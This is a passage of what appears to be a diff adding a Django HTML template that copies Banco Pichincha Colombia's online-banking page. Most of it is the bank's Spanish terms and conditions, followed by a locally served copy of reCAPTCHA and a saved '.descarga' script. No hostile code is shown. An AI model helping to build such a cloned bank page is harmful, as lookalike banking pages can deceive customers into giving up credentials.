BANCO el dinero disponible para efectuar las transferencias y/o pagos. <strong>D&Eacute;CIMA PRIMERA: </strong>Las transferencias de fondos y/o utilizaciones ordenadas por EL CLIENTE estar&aacute;n sujetas a la verificaci&oacute;n por parte del BANCO de que las cuentas y/o cupos de cr&eacute;dito a debitar tengan la suficiente provisi&oacute;n de fondos o que no presenten impedimento alguno que permitan realizar la transferencia. Si no existen fondos disponibles o si existe un impedimento, la transferencia ordenada por EL CLIENTE ser&aacute; anulada y no ejecutada el BANCO.&nbsp; <strong>D&Eacute;CIMA SEGUNDA: </strong>En la BANCA VIRTUAL el CLIENTE podr&aacute; acceder al servicio de domiciliaci&oacute;n, a trav&eacute;s del cual EL CLIENTE podr&aacute; registrar y programar&nbsp; voluntariamente el pago de sus obligaciones de servicios p&uacute;blicos y/o privados, as&iacute; como el de las obligaciones contra&iacute;das con el BANCO, con el fin de que&nbsp; &eacute;ste debite los montos correspondientes autom&aacute;ticamente mes a mes para cumplir con el pago de las obligaciones.&nbsp; Llegada la fecha de pago de la obligaci&oacute;n registrada, EL BANCO realizar&aacute; un primer intento de d&eacute;bito autom&aacute;tico del valor de la respectiva factura y/o cuenta, dentro de los cinco (5) d&iacute;as h&aacute;biles anteriores a la fecha de vencimiento de la misma. Si en dicha oportunidad EL CLIENTE no tiene los fondos suficientes para descontar el valor de la factura y/o cuenta, el BANCO realizar&aacute; diariamente un intento de d&eacute;bito durante los tres (3) d&iacute;as h&aacute;biles siguientes. De no realizarse el d&eacute;bito exitoso, el BANCO le informar&aacute; a EL CLIENTE a trav&eacute;s del medio electr&oacute;nico que tenga registrado en EL BANCO,&nbsp; para que realice el pago por otro medio. Para esto EL CLIENTE&nbsp; contar&aacute; con dos (2)&nbsp; d&iacute;as h&aacute;biles antes del vencimiento de la factura y/o cuenta para que efect&uacute;e el pago de la misma por el medio que aqu&eacute;l estime pertinente. En el evento que EL CLIENTE no quiera continuar con el servicio de domiciliaci&oacute;n de una determinada obligaci&oacute;n ya registrada y/o matriculada, &eacute;ste podr&aacute; hacer la&nbsp; cancelaci&oacute;n de dicho servicio de domiciliaci&oacute;n desde la BANCA VIRTUAL. No obstante, en el evento en que EL BANCO hubiere recibido la respectiva factura y/o cuenta para su pago, &eacute;sta se procesar&aacute; en los t&eacute;rminos indicados en esta cl&aacute;usula, y la cancelaci&oacute;n del servicio solamente proceder&aacute; respecto de las facturas y/o cuentas que se originen con posterioridad a la respectiva cancelaci&oacute;n.&nbsp; En caso que por cualquier circunstancia la factura y/o cuenta llegue a EL BANCO dentro de los cinco (5) d&iacute;as h&aacute;biles anteriores a la fecha l&iacute;mite de pago, EL BANCO&nbsp; no efectuar&aacute; el d&eacute;bito de la cuenta registrada, e informar&aacute; a EL CLIENTE a trav&eacute;s del medio electr&oacute;nico registrado en EL BANCO, para que realice el pago por otro medio. Es plenamente entendido y aceptado por EL CLIENTE que NO se realizaran d&eacute;bitos parciales, ni tampoco se tomar&aacute;n sumas de dinero de varias cuentas para realizar el pago de la factura correspondiente, el d&eacute;bito se realizar&aacute; de una sola cuenta. En el evento en que EL CLIENTE registre una cuenta corriente y &eacute;sta tenga autorizado un sobregiro, EL BANCO podr&aacute;, sin que se considere una obligaci&oacute;n a su cargo,&nbsp; descontar de dicho sobregiro el valor de la factura y/o cuenta de la (las) obligaci&oacute;n (obligaciones) domiciliada(s), suma de dinero que generar&aacute; intereses a cargo de EL CLIENTE a la tasa vigente para ese momento, hecho que desde ahora EL CLIENTE manifiesta conocer y aceptar. <strong>D&Eacute;CIMA TERCERA</strong>: El BANCO&nbsp; podr&aacute; ampliar, restringir o suprimir parcial o totalmente los servicios regulados en este documento en forma temporal o definitiva, caso en el cual notificar&aacute; previamente al CLIENTE, en forma motivada, mediante escrito dirigido o mediante comunicaci&oacute;n electr&oacute;nica a los &uacute;ltimos datos de contacto registrados, la respectiva circunstancia o decisi&oacute;n. As&iacute; mismo, el BANCO se reserva la facultad en todo tiempo, de negar el servicio, o de suspender y/o terminar el servicio en ejecuci&oacute;n, de manera unilateral, por la detecci&oacute;n de vulnerabilidades en los sistemas de operaci&oacute;n y/o procesamiento del BANCO, por la inclusi&oacute;n del CLIENTE en listados nacionales o internacionales como sospechoso de participar en actividades de lavado de activos; por&nbsp; estar vinculado EL CLIENTE de cualquier otra forma a actividades delincuenciales o de apoyo a grupos al margen de la ley, y en general, por otras causas que impliquen riesgo respecto de los recursos de los que es titular EL CLIENTE y/o que asocien al CLIENTE a actos contrarios a la ley.&nbsp;&nbsp; Ninguna de las decisiones que adopte el BANCO al amparo de las facultades establecidas en la presente cl&aacute;usula, dar&aacute; lugar a indemnizaciones a favor del CLIENTE por da&ntilde;os y perjuicios.&nbsp; <strong>D&Eacute;CIMA CUARTA</strong>: El CLIENTE se obliga a cumplir con los protocolos de seguridad de cada servicio y a no intervenir en el funcionamiento ni disponer en cualquier forma de los archivos, sistemas, programas, aplicaciones o cualquier otro elemento que el BANCO con car&aacute;cter exclusivo, reservado o propio de su actividad, utilice, posea o ponga a su disposici&oacute;n a efecto de llevar a cabo la prestaci&oacute;n de sus servicios en internet, o en cualquier otra red inform&aacute;tica, o desarrollo tecnol&oacute;gico que establezca a futuro. El CLIENTE se obliga a garantizar que los equipos que utilice est&eacute;n libres de cualquier virus, a no acceder, ni usar o disponer indebidamente, o sin autorizaci&oacute;n del BANCO los datos o la informaci&oacute;n incluida en los mismos programas, archivos, sistemas o aplicaciones. El CLIENTE se obliga a dar aviso inmediato al BANCO por un medio id&oacute;neo del conocimiento, disposici&oacute;n, uso o acceso, cualquiera que sea su causa, que tenga o hayan tenido el CLIENTE o terceros, de tales archivos, datos, sistemas, programas aplicaciones o cualquier otro elemento de los anteriormente citados. EL CLIENTE asume frente al BANCO y ante terceros la responsabilidad comprobada que se derive del incumplimiento de la presente cl&aacute;usula. <strong>D&Eacute;CIMA QUINTA</strong>: El CLIENTE se obliga a acceder a la BANCA VIRTUAL y a realizar transacciones a trav&eacute;s de equipos de uso personal, oblig&aacute;ndose a abstenerse de utilizar el servicio desde lugares p&uacute;blicos, computadores, tabletas o celulares que no sean de uso personal, ya que declara conocer que las CREDENCIALES DE AUTENTICACI&Oacute;N y dem&aacute;s elementos de seguridad para acceder al servicio se podr&iacute;an ver comprometidos por violaci&oacute;n del deber de custodia. <strong>D&Eacute;CIMA SEXTA</strong>:&nbsp; EL CLIENTE&nbsp; adquiere la obligaci&oacute;n de registrar y mantener actualizada su informaci&oacute;n, direcci&oacute;n, domicilio, correo electr&oacute;nico y celular para el env&iacute;o de las notificaciones y/o comunicaciones que EL BANCO requiera, notificando oportunamente y por cualquier medio id&oacute;neo cualquier cambio. EL CLIENTE podr&aacute; consultar la POL&Iacute;TICA DE TRATAMIENTO DE DATOS PERSONALES en <a href="http://www.bancopichincha.com.co">www.bancopichincha.com.co</a>.&nbsp; En todo caso, transcurrido seis (6) meses continuos de inactividad en el uso de la BANCA VIRTUAL, el Sistema solicitar&aacute; nuevamente el registro de nuevas&nbsp; CREDENCIALES DE AUTENTICACI&Oacute;N al CLIENTE.&nbsp; <strong>D&Eacute;CIMA SEPTIMA: </strong>La inclusi&oacute;n de links o v&iacute;nculos a otros sitios a trav&eacute;s de la BANCA VIRTUAL no implica ninguna relaci&oacute;n diferente al "link o v&iacute;nculo" en s&iacute; mismo. Todas las transacciones realizadas en los sitios a los que dirigen dichos links o v&iacute;nculos son responsabilidad exclusiva de EL CLIENTE y de la entidad relacionada. <strong>D&Eacute;CIMA OCTAVA: </strong>EL CLIENTE reconoce que el contenido (incluidos entre otros: texto, software, m&uacute;sica, sonido, fotograf&iacute;as, v&iacute;deo, gr&aacute;ficos u otro material) ubicado bien sea en la publicidad de los anunciantes o en la informaci&oacute;n producida comercialmente y distribuida de forma electr&oacute;nica y presentada a EL CLIENTE por EL BANCO por s&iacute; mismo o por un tercero autorizado, est&aacute; protegido por derechos de autor, marcas, patentes u otros bienes mercantiles o formas diferentes del derecho de propiedad. El usuario podr&aacute; hacer copia de este contenido exclusivamente para su uso personal, no comercial, siempre y cuando se mantengan intactos todos los avisos de derechos de autor y se cite la fuente. El usuario no podr&aacute; modificar, copiar, reproducir, volver a publicar, cargar, exponer, transmitir o distribuir de cualquier forma el contenido disponible a trav&eacute;s de EL BANCO y los sitios vinculados, incluidos el c&oacute;digo fuente y el software, so pena de incurrir en responsabilidad civil y responsabilidad penal, seg&uacute;n las normas vigentes. <strong>D&Eacute;CIMA NOVENA:&nbsp; </strong>Las Partes convienen que el BANCO puede cancelar, suspender, bloquear, retirar, descontinuar, limitar, modificar, suprimir o adicionar los t&eacute;rminos y condiciones de este documento, lo mismo que los privilegios y las condiciones de uso de la BANCA VIRTUAL, mediante aviso o publicaci&oacute;n previa dada en tal sentido por cualquier medio id&oacute;neo que el BANCO considere pertinente. Si pasados quince (15) d&iacute;as comunes de realizada la modificaci&oacute;n EL CLIENTE no se presentare al BANCO a cancelar el servicio, o notificare dicha decisi&oacute;n por los medios dispuestos al efecto, y/u opta por hacer uso del servicio de BANCA VIRTUAL, tal hecho se entender&aacute; como una aceptaci&oacute;n expresa de las modificaciones introducidas. Se conviene que el BANCO, a su criterio, podr&aacute; a&ntilde;adir nuevos servicios o retirar servicios que est&eacute;n en operaci&oacute;n, previa notificaci&oacute;n con la oportunidad debida al CLIENTE.<strong> VIG&Eacute;SIMA</strong>: EL CLIENTE al hacer uso de los servicios del BANCO acepta y autoriza las investigaciones y auditor&iacute;as decretadas por &eacute;ste y la utilizaci&oacute;n de la informaci&oacute;n del CLIENTE para la prevenci&oacute;n del fraude, determinaci&oacute;n de su posible ocurrencia e investigaci&oacute;n de incidentes o posibles vulnerabilidades.&nbsp; EL BANCO podr&aacute; contratar con terceras entidades el desarrollo de tales investigaciones, auditor&iacute;as y visitas al CLIENTE, el cual prestar&aacute; su colaboraci&oacute;n y asistencia, lo que implica extender su autorizaci&oacute;n, sobre las bases de debida confidencialidad, a la consulta o reporte de informaci&oacute;n concerniente a dichas operaciones, en los registros propios, todo esto, sin perjuicio de la observancia de las garant&iacute;as previstas en las disposiciones legales vigentes.&nbsp; <strong>VIG&Eacute;SIMA PRIMERA: </strong>El BANCO podr&aacute; establecer los mecanismos de control, prevenci&oacute;n y detecci&oacute;n de fraudes de acuerdo con los par&aacute;metros de seguridad establecidos por &eacute;ste, tales como generar alertas, hacer monitoreos, bloqueos, reversiones, establecer l&iacute;mites transaccionales, establecer transacciones sujetas a verificaci&oacute;n y, en general, cualquier otro control que sea considerado por el BANCO para mitigar la exposici&oacute;n al riesgo de fraude en adici&oacute;n o complemento a los controles existentes en relaci&oacute;n con los servicios ofrecidos por el BANCO.&nbsp; <strong>VIG&Eacute;SIMA SEGUNDA: </strong>EL CLIENTE autoriza al BANCO para que reverse las transacciones y/o retenga, reintegre, debite o bloquee los recursos que se hayan acreditado en sus cuentas de manera err&oacute;nea o fraudulenta por parte del BANCO u otro(s) cliente(s) del BANCO u otros bancos.&nbsp; En caso de que no sea posible el reintegro de los dineros, EL CLIENTE se obliga a devolverlos al BANCO dentro de los cinco (5) d&iacute;as h&aacute;biles siguientes a la solicitud realizada por el BANCO sin necesidad de requerimientos adicionales. El incumplimiento de lo previsto anteriormente, dar&aacute; lugar a que el BANCO inicie los procesos judiciales correspondientes con base en sus registros y lo dispuesto en el presente documento. <strong>VIG&Eacute;SIMA TERCERA: </strong>EL BANCO<strong>&nbsp; </strong>utiliza "cookies" para brindarle un servicio de alto valor agregado a sus Clientes. Las "cookies" son peque&ntilde;os archivos de texto que colocamos en el navegador del computador de los Clientes para guardar sus preferencias. Las "cookies" no suministran informaci&oacute;n sobre el correo electr&oacute;nico ni otra informaci&oacute;n personal de identificaci&oacute;n de los Clientes a menos que &eacute;stos la suministren voluntariamente, por ejemplo, al registrarse en uno de los servicios ofrecidos por el BANCO. EL BANCO usa las "cookies" para realizar seguimiento y reunir informaci&oacute;n que permita mejoras de contenido y servicios, y para guardar las contrase&ntilde;as en &aacute;reas protegidas y seguras. El BANCO NO combina las "cookies"&nbsp; con datos personales, transaccionales y/o de productos que los Clientes tengan o consulten a trav&eacute;s de la BANCA VIRTUAL y/o con el BANCO. <strong>VIG&Eacute;SIMA CUARTA: </strong>El presente documento mediante el cual se regula el canal y/o servicio de BANCA VIRTUAL no deroga los reglamentos y condiciones espec&iacute;ficas establecidas por el BANCO para cada producto y/o servicio contratado por el CLIENTE, los cuales &eacute;ste declara conocer y aceptar expresamente, y que en caso de contradicci&oacute;n entre lo consignado en este documento y/o las condiciones de uso de la BANCA VIRTUAL y los productos y/o servicios ofrecidos por el BANCO, primar&aacute; siempre la condici&oacute;n particular del respectivo servicio y/o producto contratado.&nbsp; <strong>VIG&Eacute;SIMA QUINTA: </strong>El CLIENTE ser&aacute; responsable de los da&ntilde;os y perjuicios que pueda causar al BANCO o a cualquier tercero por los usos indebidos de LA BANCA VIRTUAL de acuerdo con lo establecido en el presente documento y con sujeci&oacute;n a la Ley y Jurisdicci&oacute;n aplicables. <strong>VIG&Eacute;SIMA SEXTA:</strong> El servicio de BANCA VIRTUAL, las pol&iacute;ticas y condiciones de acceso y uso aqu&iacute; establecidas y los conflictos que puedan surgir respecto de su interpretaci&oacute;n, uso, alcance y terminaci&oacute;n se rigen por la ley Colombiana y se someten a los jueces y tribunales colombianos.&nbsp; <strong>VIG&Eacute;SIMA S&Eacute;PTIMA:</strong>&nbsp; El CLIENTE conoce, entiende y acepta expresa y plenamente los t&eacute;rminos y condiciones establecidos en el presente documento.</p></div>');
+        });
+    });
+</script>
+ 
+<div id="pageWorking" class="page-loading-state">
+    <div class="loading-indicator-wrapper">
+        <p class="">Cargando...<span class="loading-indicator"></span></p>
+    </div>
+</div>
+
+
+<script src="{% static 'js/borders.js.descarga' %}" type="text/javascript"></script>
+<!--body-mobile-external-->
+        <a href="javascript:;" id="btn_menu_mobile" class="mobile-only"></a>
+    </div>
+            
+    <script type="text/javascript">
+
+    documentReady(function () {
+        initPageTooltips();
+    });
+
+</script>
+
+<div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility linear 0.3s, opacity 0.3s linear; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="El reCAPTCHA caduca dentro de dos minutos" name="c-yn4e1y6z3dgf" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="{% static 'html/bframe.html' %}" style="width: 100%; height: 100%;"></iframe></div></div></body></html>
